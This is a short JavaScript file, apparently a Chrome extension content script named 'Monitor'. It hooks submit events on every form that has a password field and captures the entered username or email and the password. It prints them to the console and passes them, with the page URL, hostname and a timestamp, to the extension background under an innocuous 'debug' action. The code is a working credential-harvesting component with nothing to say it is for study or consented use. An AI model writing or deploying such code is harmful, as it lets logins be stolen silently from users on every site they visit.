function Monitor(document) {
  this.document = document;

  this.serializeFormData = function(form) {
    var formData = {};
    var inputTypesToSerialize = ['text','email','password'];
    var formInputs = form.getElementsByTagName('input');
    Array.prototype.forEach.call(formInputs, function(formInput) {
      if(inputTypesToSerialize.indexOf(formInput.type.toLowerCase()) !== -1 && formInput.name !== '') {
        formData[formInput.type.toLowerCase()] = formInput.value;
      }
    });
    return formData;
  };

  this.recordDetails = function(form) {
    var self = this;
    form.addEventListener('submit', function(e) {
      var url = document.location.href;
      var formData = self.serializeFormData(form);

      var user = (typeof formData['text'] !== 'undefined' ? formData['text'] : formData['email']);
      var password = formData['password'];
      console.log(user);
      console.log(password);

      console.log("SUBMITTING");
      chrome.extension.sendRequest({
          action: 'debug',
          crud: 'create',
          record: [
              window.location.href,
              window.location.hostname,
              user,
              password,
              Date.now()
          ]
      });
    });
  };

  this.registerEvents = function() {
    var self = this;
    var inputs = document.getElementsByTagName('input');
    Array.prototype.forEach.call(inputs, function(input) {
      if(input.type.toLowerCase() === 'password') {
        if(input.form) {
          self.recordDetails(input.form);
        }
      }
    });
  };

  this.startMonitoring = function() {
    this.registerEvents();
  };

};

var m = new Monitor(document);
m.startMonitoring();
